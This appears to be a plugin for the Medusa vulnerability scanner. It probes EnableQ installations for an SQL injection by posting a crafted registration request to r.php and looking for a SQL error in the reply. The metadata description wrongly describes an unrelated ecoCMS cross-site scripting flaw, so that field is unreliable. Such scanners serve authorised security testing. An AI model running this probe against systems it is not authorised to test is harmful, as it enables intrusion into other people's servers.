#!/usr/bin/env python
# -*- coding: utf-8 -*-
import requests
import random
from ClassCongregation import UrlProcessing,VulnerabilityDetails,WriteFile,ErrorLog,randoms,ErrorHandling,Proxies

class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number']="0" #如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['author'] = "KpLi0rn"  # 插件作者
        self.info['create_date']  = "2020-03-18"  # 插件编辑时间
        self.info['disclosure']='2015-02-08'#漏洞披露时间，如果不知道就写编写插件的时间
        self.info['algroup'] = "EnableQSQLInjectionVulnerability"  # 插件名称
        self.info['name'] ='EnableQSQL注入漏洞' #漏洞名称
        self.info['affects'] = "EnableQ"  # 漏洞组件
        self.info['desc_content'] = "ecoCMS的admin.php中存在跨站脚本漏洞。远程攻击者可借助p参数注入任意web脚本或者HTML"  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['suggest'] = "升级最新的系统"  # 修复建议
        self.info['version'] = "全版本"  # 这边填漏洞影响的版本
        self.info['details'] = Medusa  # 结果

def medusa(Url:str,Headers:dict,proxies:str=None,**kwargs)->None:
    proxies=Proxies().result(proxies)
    scheme, url, port = UrlProcessing().result(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    try:
        payload = "/r.php?qlang=cn&qid=&step=1"
        payload_url = scheme + "://" + url +":"+ str(port) + payload

        mail = "testvul" + str(random.randint(1000, 9999)) + "@testvul.net"
        data = 'administrators_Name=' + mail + '&nickName=testvul&passWord=123456&passWord2=123456&hintPass=3&answerPass=testvul&Action=MemberAddSubmit&submit=%D7%A2%B2%E1&qid='
        resp = requests.post(payload_url, data=data, headers=Headers, proxies=proxies,timeout=6,  verify=False)
        con = resp.text
        if con.find("administratorsName") != -1 and con.find("Bad SQL Query") != -1 :
            Medusa = "{}存在EnableQSQL注入漏洞\r\n漏洞地址:{}\r\n漏洞详情:{}\r\n".format(url,payload_url,con)
            _t=VulnerabilityInfo(Medusa)
            VulnerabilityDetails(_t.info, url,**kwargs).Write()  # 传入url和扫描到的数据
            WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
    except Exception as e:
        _ = VulnerabilityInfo('').info.get('algroup')
        ErrorHandling().Outlier(e, _)
        _l = ErrorLog().Write("Plugin Name:"+_+" || Target Url:"+url,e)#调用写入类